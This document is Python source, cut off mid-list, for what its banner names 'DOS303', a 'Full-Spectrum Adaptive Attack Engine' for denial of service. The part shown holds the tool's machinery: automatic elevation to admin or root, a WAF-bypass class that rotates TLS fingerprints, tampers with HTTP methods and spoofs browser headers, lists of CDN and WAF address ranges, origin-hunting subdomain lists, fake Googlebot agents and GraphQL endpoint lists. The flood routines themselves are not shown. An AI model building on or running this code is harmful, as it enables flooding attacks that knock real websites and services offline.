
import os, sys, ctypes, time, random, socket, struct, json, re, ssl, base64, subprocess, hashlib
import signal, argparse, logging, logging.handlers, threading, atexit, ipaddress
import urllib3
import importlib
import importlib.util
from collections import OrderedDict, Counter
from datetime import datetime, timedelta
from typing import Optional, List, Dict, Set, Tuple, Callable, Any, TYPE_CHECKING

if TYPE_CHECKING:
    import uvloop
    import winloop

# v65.1: Platform detection
IS_WINDOWS = sys.platform == "win32"
IS_LINUX = sys.platform.startswith("linux")
IS_DARWIN = sys.platform == "darwin"
PLATFORM_NAME = "Windows" if IS_WINDOWS else "Linux" if IS_LINUX else "macOS" if IS_DARWIN else sys.platform

try:
    sys.setswitchinterval(0.001)
except Exception:
    pass

try:
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    os.environ["PYTHONIOENCODING"] = "utf-8"
except Exception:
    pass

def _silent_unraisable(unraisable):
    try:
        exc_msg = str(unraisable.exc_value) if unraisable.exc_value else ""
        if "peer-initiated" in exc_msg or "Cannot send data" in exc_msg or "unidirectional" in exc_msg:
            return
    except Exception:
        pass
    try:
        sys.__unraisablehook__(unraisable)
    except Exception:
        pass

sys.unraisablehook = _silent_unraisable

import multiprocessing as mp
import queue as queue_module
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin, quote, unquote
from functools import partial
from dataclasses import dataclass, field

# ============================================================================
# HELPERS
# ============================================================================
def humanbytes(n, suffix="B"):
    try:
        n = float(n)
    except Exception:
        return f"0 {suffix}"
    for unit in ("", "K", "M", "G", "T", "P", "E"):
        if abs(n) < 1024.0:
            if unit == "":
                return f"{int(n)} {suffix}"
            return f"{n:.2f} {unit}{suffix}"
        n /= 1024.0
    return f"{n:.2f} Z{suffix}"

def to_mb(n):
    try:
        return float(n) / (1024.0 * 1024.0)
    except Exception:
        return 0.0

def to_gb(n):
    try:
        return float(n) / (1024.0 * 1024.0 * 1024.0)
    except Exception:
        return 0.0

def sanitize_url(url):
    if not url:
        return url
    url = url.strip()
    for scheme in ("https://", "http://"):
        if url.count(scheme) > 1:
            idx = url.rfind(scheme)
            tail = url[idx + len(scheme):]
            url = scheme + tail.split("/")[0]
            break
    return url

# ============================================================================
# v65.1: Adaptive ThreadPoolExecutor — با توقف واقعی workerهای اضافی
# ============================================================================
class AdaptiveThreadPoolExecutor:
    """ThreadPoolExecutor با dynamic scaling و توقف واقعی workerهای اضافی."""
    def __init__(self, initial_workers=30, min_workers=10, max_workers=200,
                 thread_name_prefix="adaptive"):
        self.min_workers = min_workers
        self.max_workers = max_workers
        self._target_workers = initial_workers
        self._active_futures = []
        self._executor = ThreadPoolExecutor(max_workers=initial_workers,
                                             thread_name_prefix=thread_name_prefix)
        self._lock = threading.Lock()
        self._running = True
        self._worker_stop = threading.Event()  # v65.1: برای متوقف کردن workerهای اضافی

    def set_target(self, n):
        """Set target worker count (workerهای اضافی متوقف میشوند)."""
        n = max(self.min_workers, min(self.max_workers, n))
        with self._lock:
            if n != self._target_workers:
                self._target_workers = n
                # v65.1: ایجاد executor جدید با max_workers جدید
                old_executor = self._executor
                self._executor = ThreadPoolExecutor(max_workers=n,
                                                     thread_name_prefix="adaptive")
                # v65.1: علامتدهی به workerهای قدیمی برای توقف
                # (workerهای جدید از target جدید استفاده میکنند)
                try:
                    old_executor.shutdown(wait=False)
                except Exception:
                    pass

    def submit(self, fn, *args, **kwargs):
        with self._lock:
            return self._executor.submit(fn, *args, **kwargs)

    def get_target(self):
        with self._lock:
            return self._target_workers

    def shutdown(self, wait=True):
        with self._lock:
            self._running = False
            try:
                self._executor.shutdown(wait=wait)
            except Exception:
                pass

# ============================================================================
# v65.1: Resource-aware gate
# ============================================================================
class ResourceGate:
    """Global gate for resource-based pausing."""
    def __init__(self):
        self.lock = threading.Lock()
        self._paused = False
        self._reason = ""
        self._ram_pct = 0.0
        self._cpu_pct = 0.0

    def update(self, ram_pct, cpu_pct):
        with self.lock:
            self._ram_pct = ram_pct
            self._cpu_pct = cpu_pct
            if ram_pct > 90 or cpu_pct > 95:
                self._paused = True
                self._reason = f"RAM={ram_pct:.0f}% CPU={cpu_pct:.0f}%"
            elif ram_pct < 75 and cpu_pct < 80:
                self._paused = False
                self._reason = ""

    def is_paused(self):
        with self.lock:
            return self._paused

    def reason(self):
        with self.lock:
            return self._reason

_resource_gate = ResourceGate()

# ============================================================================
# v65.1: H2 ALPN probe
# ============================================================================
async def probe_h2_alpn(host, port, timeout=3.0):
    """Probe if target supports h2 ALPN."""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2", "http/1.1"])
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=ctx, server_hostname=host),
            timeout=timeout
        )
        ssl_obj = writer.transport.get_extra_info('ssl_object')
        alpn = ssl_obj.selected_alpn_protocol() if ssl_obj else None
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        return alpn == "h2"
    except Exception:
        return False

# ============================================================================
# v65.1: WAF Bypass Engine
# ============================================================================
class WAFBypassEngine:
    TLS_PROFILES = [
        "chrome136", "chrome133a", "chrome124", "chrome123", "chrome120",
        "chrome119", "chrome116", "chrome110", "chrome107", "chrome104",
        "chrome101", "chrome100", "chrome99",
        "safari260", "safari184", "safari180", "safari172_ios", "safari170",
        "firefox147", "firefox144", "firefox135", "firefox133",
        "edge101", "edge99",
    ]
    METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD",
               "OPTIONS", "TRACE", "CONNECT", "FOO", "BAR"]
    OVERRIDE_HEADERS = [
        "X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override",
        "X-Original-Method", "X-Forwarded-Method",
    ]
    ENCODING_VARIATIONS = ["identity", "gzip", "deflate", "br", "chunked"]

    @staticmethod
    def align_headers(ua, sec_ch, base_headers):
        headers = OrderedDict(base_headers)
        if "Chrome/" in ua and "Edg/" not in ua:
            headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
            headers["Sec-Fetch-Site"] = random.choice(["none", "same-origin", "cross-site"])
            headers["Sec-Fetch-Mode"] = "navigate"
            headers["Sec-Fetch-User"] = "?1"
            headers["Sec-Fetch-Dest"] = "document"
            headers["Accept-Encoding"] = "gzip, deflate, br, zstd"
            headers["Accept-Language"] = random.choice([
                "en-US,en;q=0.9", "en-GB,en;q=0.8", "en-CA,en;q=0.9",
                "en-US,en;q=0.9,es;q=0.8", "en-US,en;q=0.9,fr;q=0.8",
                "fa-IR,fa;q=0.9,en;q=0.8",
            ])
            headers["sec-ch-ua-mobile"] = "?0"
            headers["sec-ch-ua-platform"] = random.choice(['"Windows"', '"macOS"', '"Linux"'])
        elif "Firefox/" in ua:
            headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
            headers["Sec-Fetch-Site"] = random.choice(["none", "same-origin", "cross-site"])
            headers["Sec-Fetch-Mode"] = "navigate"
            headers["Sec-Fetch-User"] = "?1"
            headers["Sec-Fetch-Dest"] = "document"
            headers["Accept-Encoding"] = "gzip, deflate, br"
            headers["Accept-Language"] = random.choice(["en-US,en;q=0.5", "en-GB,en;q=0.5", "fa-IR,fa;q=0.5"])
            for k in ["sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform"]:
                headers.pop(k, None)
        elif "Safari/" in ua:
            headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            headers["Sec-Fetch-Site"] = random.choice(["none", "same-origin"])
            headers["Sec-Fetch-Mode"] = "navigate"
            headers["Sec-Fetch-User"] = "?1"
            headers["Sec-Fetch-Dest"] = "document"
            headers["Accept-Encoding"] = "gzip, deflate, br"
            headers["Accept-Language"] = random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8"])
            for k in ["sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform"]:
                headers.pop(k, None)
        elif "Edg/" in ua:
            headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
            headers["Sec-Fetch-Site"] = random.choice(["none", "same-origin", "cross-site"])
            headers["Sec-Fetch-Mode"] = "navigate"
            headers["Sec-Fetch-User"] = "?1"
            headers["Sec-Fetch-Dest"] = "document"
            headers["Accept-Encoding"] = "gzip, deflate, br, zstd"
            headers["Accept-Language"] = random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8"])
            headers["sec-ch-ua-mobile"] = "?0"
            headers["sec-ch-ua-platform"] = random.choice(['"Windows"', '"macOS"'])
        return headers

    @staticmethod
    def apply_method_tampering(method, extra):
        if random.random() < 0.15:
            override = random.choice(WAFBypassEngine.OVERRIDE_HEADERS)
            if method in ("GET", "HEAD", "OPTIONS"):
                extra[override] = random.choice(["POST", "PUT", "PATCH", "DELETE"])
            elif method in ("POST", "PUT", "PATCH", "DELETE"):
                extra[override] = "GET"
        return extra

    @staticmethod
    def apply_encoding_variation(extra, body):
        if random.random() < 0.1:
            enc = random.choice(["chunked", "gzip", "deflate", "br"])
            if enc == "chunked":
                extra["Transfer-Encoding"] = "chunked"
                extra.pop("Content-Length", None)
            else:
                extra["Content-Encoding"] = enc
        return extra

    @staticmethod
    def random_method():
        return random.choices(
            WAFBypassEngine.METHODS,
            weights=[0.30, 0.15, 0.08, 0.05, 0.05, 0.08, 0.05, 0.03, 0.03, 0.05, 0.05],
            k=1
        )[0]

    @staticmethod
    def random_tls_profile():
        return random.choice(WAFBypassEngine.TLS_PROFILES)

# ============================================================================
# v65.1: Adaptive Controller (با callback و worker stop واقعی)
# ============================================================================
class AdaptiveController:
    def __init__(self, initial_workers=5000, min_workers=10, max_workers=50000):
        self.lock = threading.Lock()
        self.workers = initial_workers
        self.min_workers = min_workers
        self.max_workers = max_workers
        self.cpu_pct = 0.0
        self.ram_pct = 0.0
        self.ram_avail_gb = 0.0
        self.net_mbps = 0.0
        self.running = False
        self.thread = None
        self.interval = 2.0
        self._callback = None
        self._prev_net = None
        self._prev_time = None

    def set_worker_callback(self, callback):
        """Register callback: callback(new_workers)"""
        self._callback = callback

    def start(self):
        try:
            self._prev_net = psutil.net_io_counters()
            self._prev_time = time.monotonic()
        except Exception:
            pass
        self.running = True
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()
        return True

    def _loop(self):
        try:
            psutil.cpu_percent(interval=None)
            time.sleep(0.5)
        except Exception:
            pass
        while self.running:
            try:
                cpu = psutil.cpu_percent(interval=None)
                mem = psutil.virtual_memory()
                ram_pct = mem.percent
                ram_avail = mem.available / (1024 ** 3)
                try:
                    net = psutil.net_io_counters()
                    mbps = 0.0
                    if self._prev_net:
                        dt = max(0.001, time.monotonic() - self._prev_time)
                        mbps = (net.bytes_sent - self._prev_net.bytes_sent) * 8 / dt / 1e6
                    self._prev_net = net
                    self._prev_time = time.monotonic()
                except Exception:
                    mbps = 0.0

                with self.lock:
                    self.cpu_pct = cpu
                    self.ram_pct = ram_pct
                    self.ram_avail_gb = ram_avail
                    self.net_mbps = mbps

                _resource_gate.update(ram_pct, cpu)

                self._adjust_workers(cpu, ram_pct)
            except Exception:
                pass
            time.sleep(self.interval)

    def _adjust_workers(self, cpu, ram_pct):
        with self.lock:
            old = self.workers
            if cpu > 90 or ram_pct > 90:
                self.workers = max(self.min_workers, int(self.workers * 0.7))
            elif cpu > 75 or ram_pct > 80:
                self.workers = max(self.min_workers, int(self.workers * 0.9))
            elif cpu < 50 and ram_pct < 60:
                self.workers = min(self.max_workers, int(self.workers * 1.1))

            if old != self.workers and self._callback:
                try:
                    self._callback(self.workers)
                except Exception:
                    pass

    def get_workers(self):
        with self.lock:
            return self.workers

    def set_workers(self, n):
        with self.lock:
            self.workers = max(self.min_workers, min(self.max_workers, n))

    def snapshot(self):
        with self.lock:
            return {
                "workers": self.workers,
                "cpu_pct": self.cpu_pct,
                "ram_pct": self.ram_pct,
                "ram_avail_gb": self.ram_avail_gb,
                "net_mbps": self.net_mbps,
            }

    def stop(self):
        self.running = False

# ============================================================================
# v65.1: Resource Monitor
# ============================================================================
class ResourceMonitor:
    def __init__(self, interval=2.0):
        self.interval = interval
        self.running = False
        self.thread = None
        self.lock = threading.Lock()
        self.stats = {
            "cpu_pct": 0.0, "ram_pct": 0.0, "ram_avail_gb": 0.0,
            "ram_used_gb": 0.0, "net_mbps_out": 0.0, "net_mbps_in": 0.0,
            "net_pps_out": 0.0, "disk_io_mbps": 0.0,
            "cpu_cores": psutil.cpu_count(logical=True) if hasattr(psutil, 'cpu_count') else 0,
            "ram_total_gb": psutil.virtual_memory().total / (1024 ** 3) if hasattr(psutil, 'virtual_memory') else 0,
        }
        self._prev_net = None
        self._prev_time = None
        self._prev_disk = None

    def start(self):
        try:
            self._prev_net = psutil.net_io_counters()
            self._prev_time = time.monotonic()
            try:
                self._prev_disk = psutil.disk_io_counters()
            except Exception:
                self._prev_disk = None
        except Exception:
            return False
        self.running = True
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()
        return True

    def _loop(self):
        try:
            psutil.cpu_percent(interval=None)
            time.sleep(0.5)
        except Exception:
            pass
        while self.running:
            try:
                cpu = psutil.cpu_percent(interval=None)
                mem = psutil.virtual_memory()
                net = psutil.net_io_counters()
                now = time.monotonic()
                dt = max(0.001, now - self._prev_time)
                mbps_out = (net.bytes_sent - self._prev_net.bytes_sent) * 8 / dt / 1e6
                mbps_in = (net.bytes_recv - self._prev_net.bytes_recv) * 8 / dt / 1e6
                pps_out = (net.packets_sent - self._prev_net.packets_sent) / dt
                disk_mbps = 0.0
                try:
                    if self._prev_disk:
                        disk = psutil.disk_io_counters()
                        if disk and self._prev_disk:
                            disk_mbps = (disk.write_bytes - self._prev_disk.write_bytes) / dt / 1e6
                            self._prev_disk = disk
                except Exception:
                    pass
                with self.lock:
                    self.stats.update({
                        "cpu_pct": cpu,
                        "ram_pct": mem.percent,
                        "ram_avail_gb": mem.available / (1024 ** 3),
                        "ram_used_gb": (mem.total - mem.available) / (1024 ** 3),
                        "net_mbps_out": mbps_out,
                        "net_mbps_in": mbps_in,
                        "net_pps_out": pps_out,
                        "disk_io_mbps": disk_mbps,
                    })
                self._prev_net = net
                self._prev_time = now
            except Exception:
                pass
            time.sleep(self.interval)

    def snapshot(self):
        with self.lock:
            return dict(self.stats)

    def stop(self):
        self.running = False

# ============================================================================
# DNS TARGETS
# ============================================================================
DNS_TARGETS = [
    ("1.1.1.1", 53), ("8.8.8.8", 53), ("10.202.10.202", 53),
    ("9.9.9.9", 53), ("208.67.222.222", 53),
]

# ============================================================================
# H2 VERSION
# ============================================================================
def check_h2_version():
    try:
        import h2
        version = getattr(h2, "__version__", "unknown")
        try:
            parts = version.split(".")
            return version, (int(parts[0]), int(parts[1])) >= (4, 4)
        except Exception:
            return version, False
    except ImportError:
        return None, False

H2_VERSION, H2_PATCHED = check_h2_version()

def get_curl_cffi_version():
    try:
        import curl_cffi
        return getattr(curl_cffi, "__version__", "unknown")
    except ImportError:
        return None

CURL_CFFI_VERSION = get_curl_cffi_version()

# ============================================================================
# ADMIN
# ============================================================================
def is_admin():
    try:
        if IS_WINDOWS:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        return os.geteuid() == 0
    except Exception:
        return False

def elevate_to_admin():
    if IS_WINDOWS:
        script = os.path.abspath(sys.argv[0])
        params = " ".join([f'"{a}"' if " " in a else a for a in sys.argv[1:]])
        try:
            ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable,
                                                       f'"{script}" {params}', None, 1)
            if ret > 32:
                sys.exit(0)
            else:
                print("[!] UAC elevation failed.")
                sys.exit(1)
        except Exception as e:
            print(f"[!] {e}")
            sys.exit(1)
    else:
        script = os.path.abspath(sys.argv[0])
        args = [sys.executable, script] + sys.argv[1:]
        try:
            os.execvp("sudo", ["sudo"] + args)
        except FileNotFoundError:
            print("[!] sudo not found.")
            sys.exit(1)

def enforce_admin():
    if is_admin():
        return True
    print("\n" + "=" * 70)
    print("NOT RUNNING AS ADMIN/ROOT — attempting elevation")
    print("=" * 70 + "\n")
    try:
        elevate_to_admin()
    except SystemExit:
        raise
    except Exception as e:
        print(f"[!] {e}")
        return False

# ============================================================================
# EVENT LOOP
# ============================================================================
import asyncio

PLAYWRIGHT_AVAILABLE = False
try:
    if importlib.util.find_spec("playwright") is not None:
        from playwright.async_api import async_playwright
        PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

_LOOP_BACKEND = "Default (asyncio)"

if IS_WINDOWS:
    if PLAYWRIGHT_AVAILABLE:
        _LOOP_BACKEND = "Proactor (Windows) — Playwright compatible"
    else:
        try:
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
            _LOOP_BACKEND = "Selector (Windows) — sock_connect OK"
        except Exception:
            _LOOP_BACKEND = "Proactor (Windows) — fallback"
    if importlib.util.find_spec("winloop") is not None and not PLAYWRIGHT_AVAILABLE:
        try:
            _winloop = importlib.import_module("winloop")
            _winloop.install()
            _LOOP_BACKEND = "Winloop (Windows)"
        except Exception:
            pass
else:
    if importlib.util.find_spec("uvloop") is not None:
        try:
            _uvloop = importlib.import_module("uvloop")
            _uvloop.install()
            _LOOP_BACKEND = "UVLoop (POSIX)"
        except Exception:
            pass

HAS_ADMIN = enforce_admin()

# ============================================================================
# IMPORTS
# ============================================================================
try:
    import aiohttp, psutil
    import httpx, requests
    from colorama import Fore, Back, Style, init as colorama_init
    from tqdm import tqdm
except ImportError as e:
    print(f"Missing: {e}")
    sys.exit(1)

try:
    from curl_cffi import requests as curl_requests
    from curl_cffi import CurlOpt
    CURL_CFFI_AVAILABLE = True
except ImportError:
    CURL_CFFI_AVAILABLE = False
    CurlOpt = None
    curl_requests = None

try:
    import cloudscraper
    CLOUDSCRAPER_AVAILABLE = True
except ImportError:
    CLOUDSCRAPER_AVAILABLE = False
    cloudscraper = None

try:
    from scapy.all import IP, ICMP, TCP, UDP, Raw, send, sendp, Ether, sr1, conf, DNS, DNSQR, DNSRR
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import h2.connection, h2.config, h2.events, h2.settings, h2.errors
    H2_AVAILABLE = True
except ImportError:
    H2_AVAILABLE = False

try:
    from aioquic.asyncio import connect, QuicConnectionProtocol
    from aioquic.quic.configuration import QuicConfiguration
    from aioquic.h3.connection import H3Connection
    from aioquic.quic.connection import stream_is_unidirectional
    AIOQUIC_AVAILABLE = True
except ImportError:
    AIOQUIC_AVAILABLE = False
    QuicConnectionProtocol = object
    H3Connection = None
    connect = None
    QuicConfiguration = None
    stream_is_unidirectional = None

try:
    from aiohttp_socks import ProxyConnector, ProxyType
    AIOHTTP_SOCKS_AVAILABLE = True
except ImportError:
    AIOHTTP_SOCKS_AVAILABLE = False
    ProxyConnector = None
    ProxyType = None

try:
    import socks as pysocks
    PYSOCKS_AVAILABLE = True
except ImportError:
    PYSOCKS_AVAILABLE = False
    pysocks = None

try:
    from pysnmp.hlapi.v3arch.asyncio import (
        SnmpEngine, CommunityData, UdpTransportTarget,
        ContextData, ObjectType, ObjectIdentity, get_cmd
    )
    PYSNMP_AVAILABLE = True
except ImportError:
    PYSNMP_AVAILABLE = False
    SnmpEngine = None
    CommunityData = None
    UdpTransportTarget = None
    ContextData = None
    ObjectType = None
    ObjectIdentity = None
    get_cmd = None

BROWSERFORGE_AVAILABLE = False
HeaderGenerator = None
FingerprintGenerator = None

if importlib.util.find_spec("browserforge") is not None:
    try:
        _bf_headers = importlib.import_module("browserforge.headers")
        _bf_fingerprints = importlib.import_module("browserforge.fingerprints")
        HeaderGenerator = getattr(_bf_headers, "HeaderGenerator", None)
        FingerprintGenerator = getattr(_bf_fingerprints, "FingerprintGenerator", None)
        BROWSERFORGE_AVAILABLE = HeaderGenerator is not None
    except Exception:
        BROWSERFORGE_AVAILABLE = False

colorama_init(autoreset=True)

# ============================================================================
# LOGGING
# ============================================================================
class SSLSpamFilter(logging.Filter):
    SPAM = ("SSL connection is closed", "Connection reset by peer",
            "Connection aborted", "Broken pipe", "Cannot connect to host",
            "Server disconnected", "Timeout", "timed out", "Too many open files",
            "too many file descriptors", "peer-initiated", "unidirectional",
            "Cannot send data")
    def filter(self, record):
        try:
            msg = record.getMessage()
        except Exception:
            return True
        return not any(p in msg for p in self.SPAM)

class SafeASCIIFormatter(logging.Formatter):
    COLORS = {'DEBUG': Fore.CYAN, 'INFO': Fore.GREEN, 'WARNING': Fore.YELLOW,
              'ERROR': Fore.RED, 'CRITICAL': Fore.RED + Back.WHITE}
    def format(self, record):
        lv = record.levelname
        if lv in self.COLORS:
            record.levelname = f"{self.COLORS[lv]}{lv}{Style.RESET_ALL}"
        try:
            s = super().format(record)
        except Exception:
            try:
                s = super().format(record).encode("ascii", errors="replace").decode("ascii")
            except Exception:
                s = "<log error>"
        try:
            (sys.stdout.encoding or "utf-8") and s.encode(sys.stdout.encoding or "utf-8")
        except Exception:
            try:
                s = s.encode("ascii", errors="replace").decode("ascii")
            except Exception:
                pass
        return s

log_queue = queue_module.Queue(-1)
_queue_handler = logging.handlers.QueueHandler(log_queue)
_stream_handler = logging.StreamHandler()
_stream_handler.setFormatter(SafeASCIIFormatter('[%(asctime)s] %(levelname)s - %(message)s', datefmt='%H:%M:%S'))
_stream_handler.addFilter(SSLSpamFilter())
_listener = logging.handlers.QueueListener(log_queue, _stream_handler, respect_handler_level=True)
_listener.start()

logger = logging.getLogger('DOS303')
logger.setLevel(logging.INFO)
logger.handlers.clear()
logger.addHandler(_queue_handler)

for _name in ("curl_cffi", "curl_cffi.requests", "urllib3", "aiohttp", "httpx", "asyncio", "h2", "aioquic"):
    _lg = logging.getLogger(_name)
    _lg.setLevel(logging.CRITICAL)
    _lg.addFilter(SSLSpamFilter())

# ============================================================================
# INPUT/OUTPUT
# ============================================================================
INPUT_LOCK = threading.Lock()

def safe_input(prompt=""):
    with INPUT_LOCK:
        return input(prompt)

def keep_terminal_open():
    try:
        if sys.stdin and sys.stdin.isatty():
            safe_input("\n" + Fore.YELLOW + "Press Enter to exit..." + Style.RESET_ALL)
    except Exception:
        pass

atexit.register(keep_terminal_open)

def _silent_handler(loop, context):
    exc = context.get("exception")
    if isinstance(exc, (ConnectionResetError, ConnectionAbortedError, BrokenPipeError, ssl.SSLError, OSError)):
        return
    msg = str(context.get("message", ""))
    for pat in ("ConnectionResetError", "WinError 10054", "SSL connection is closed",
                "Connection aborted", "Broken pipe", "too many file descriptors",
                "peer-initiated", "unidirectional", "Cannot send data"):
        if pat in msg:
            return
    try:
        loop.default_exception_handler(context)
    except Exception:
        pass

# ============================================================================
# BANNER
# ============================================================================
def show_banner():
    os.system('cls' if IS_WINDOWS else 'clear')
    ja4 = "curl_cffi" if CURL_CFFI_AVAILABLE else "requests"
    raw = "Raw Socket" if HAS_ADMIN else "Disabled"
    h2_lbl = f"{H2_VERSION} ({'PATCHED' if H2_PATCHED else 'CVE-2026-71554'})" if H2_AVAILABLE else "N/A"
    snmp_lbl = "OK" if PYSNMP_AVAILABLE else "NO"
    bf_lbl = "OK" if BROWSERFORGE_AVAILABLE else "NO"
    pw_lbl = "OK" if PLAYWRIGHT_AVAILABLE else "NO"
    cs_lbl = "OK" if CLOUDSCRAPER_AVAILABLE else "NO"
    cffi_ver = CURL_CFFI_VERSION if CURL_CFFI_VERSION else "N/A"
    banner = (
        "+" + "-" * 98 + "+\n"
        "| DOS303 v65.1 — Full-Spectrum Adaptive Attack Engine (FINAL)" + " " * 30 + "|\n"
        "| 25 HTTP methods + 45 L4/Game methods + WAF Bypass Engine" + " " * 16 + "|\n"
        "| SNI Override | JA3/JA4 Rotation | Steam | Quake | RIPv1 | Kad | BitTorrent" + " " * 7 + "|\n"
        "| Adaptive ThreadPool | Resource Gate | H2 ALPN Probe | SlowRead Fix | Brotli Bomb" + " " * 5 + "|\n"
        "+" + "-" * 98 + "+\n"
        f"  Admin: {'OK' if HAS_ADMIN else 'NO'} | Platform: {PLATFORM_NAME} | Loop: {_LOOP_BACKEND}\n"
        f"  HTTP: {ja4} (v{cffi_ver}) | L4: {raw} | h2: {h2_lbl} | BF: {bf_lbl} | PW: {pw_lbl} | CS: {cs_lbl}\n"
        f"  aiohttp_socks: {'OK' if AIOHTTP_SOCKS_AVAILABLE else 'NO'} | PySocks: {'OK' if PYSOCKS_AVAILABLE else 'NO'} | SNMP: {snmp_lbl}\n"
        f"  v65.1: Adaptive ThreadPool FIX | GraphQL FIX | H3 ALPN FIX | Brotli Bomb | Land Attack\n"
    )
    try:
        print(Fore.GREEN + banner + Style.RESET_ALL)
    except Exception:
        print(banner)

# ============================================================================
# CONSTANTS
# ============================================================================
CLOUDFLARE_CIDRS = [
    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13",
    "104.24.0.0/14", "108.162.192.0/18", "131.0.72.0/22", "141.101.64.0/18",
    "162.158.0.0/15", "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20",
    "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
]
AKAMAI_CIDRS = ["23.32.0.0/11", "23.64.0.0/14", "23.192.0.0/11", "96.6.0.0/15",
                "96.16.0.0/15", "184.24.0.0/13", "184.50.0.0/15", "184.84.0.0/14"]
FASTLY_CIDRS = ["23.235.32.0/20", "43.249.72.0/22", "103.244.50.0/24", "103.245.222.0/23",
                "103.245.224.0/24", "104.156.80.0/20", "146.75.0.0/16", "151.101.0.0/16"]
INCAPSULA_CIDRS = ["45.64.64.0/22", "107.154.0.0/16", "149.126.72.0/21", "185.11.124.0/22"]
IRANIAN_CDN_CIDRS = [
    "185.143.232.0/22", "188.121.120.0/22", "37.32.0.0/19", "188.34.0.0/16",
    "185.143.0.0/16", "92.114.0.0/16", "193.176.240.0/24", "185.220.226.0/24",
    "130.185.120.0/22", "194.5.206.0/23", "170.82.172.0/22", "188.229.116.16/29",
    "128.0.105.0/24", "185.143.233.0/24", "185.143.234.0/24", "185.204.168.0/22",
    "217.218.0.0/16", "217.219.0.0/16",
]
ALL_WAF_CIDRS = CLOUDFLARE_CIDRS + AKAMAI_CIDRS + FASTLY_CIDRS + INCAPSULA_CIDRS
ALL_IRANIAN_CIDRS = IRANIAN_CDN_CIDRS

COMMON_SUBDOMAINS = ["mail", "dev", "staging", "origin", "cpanel", "webmail", "direct",
                     "backend", "api", "admin", "portal", "test", "stage", "prod",
                     "server", "host", "vpn", "ftp", "sftp", "ssh", "db", "database",
                     "app", "mobile", "m", "www2", "web", "ns1", "ns2", "dns", "mx",
                     "cdn", "static", "assets", "media", "img", "images", "files",
                     "blog", "shop", "store", "secure", "login", "auth", "sso"]

CURL_IMPERSONATE = WAFBypassEngine.TLS_PROFILES

GOOGLEBOT_AGENTS = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
]

REFERER_PREFIXES = [
    "https://www.facebook.com/l.php?u=", "https://www.google.com/translate?u=",
    "https://www.bing.com/search?q=", "https://duckduckgo.com/?q=",
    "https://search.yahoo.com/search?p=", "https://www.reddit.com/submit?url=",
    "https://twitter.com/intent/tweet?url=", "https://vk.com/share.php?url=",
    "https://t.me/share/url?url=", "https://wa.me/?text=",
    "https://www.linkedin.com/sharing/share-offsite/?url=",
    "https://www.pinterest.com/pin/create/button/?url=",
    "https://api.whatsapp.com/send?text=",
    "https://www.tumblr.com/widgets/share/tool?canonicalUrl=",
]

COOKIE_NAMES = [
    "PHPSESSID", "session_id", "JSESSIONID", "csrftoken", "_ga", "cf_clearance",
    "ASP.NET_SessionId", "laravel_session", "XSRF-TOKEN", "wordpress_logged_in",
    "wp-settings-1", "wp-settings-time-1", "PHPSESSID", "session", "sid",
    "auth", "token", "jwt", "access_token", "refresh_token",
    "_gid", "_gat", "__cfduid", "incap_ses_1234_5678", "_fbp", "_hjid",
]

GRAPHQL_ENDPOINTS = [
    "/graphql", "/graphiql", "/api/graphql", "/v1/graphql", "/v2/graphql", "/query", "/gql",
    "/api/v1/graphql", "/api/v2/graphql", "/graphql/console", "/graphql.php",
    "/index.php?graphql", "/wp-graphql", "/gql/console", "/altair",
    "/playground", "/graphql/v1", "/graphql/v2", "/graphql/schema",
    "/api/query", "/data/graphql", "/api/gql", "/graphql/api", "/graphql/graphql",
    "/api", "/api/v1", "/api/v2", "/v1/api/graphql", "/v2/api/graphql",
    "/graphql/alpha", "/graphql/beta", "/graphql/stable", "/graphql/dev",
    "/graphql/test", "/graphql/staging", "/graphql/prod", "/graphql/production",
    "/gql", "/gql/api", "/graphql/admin", "/graphql/debug",
    "/graphql/graphiql", "/graphql/playground", "/graphql/altair",
    "/api/graphiql", "/api/playground", "/api/altair",
    "/api/gql", "/api/graphql/v1", "/api/graphql/v2",
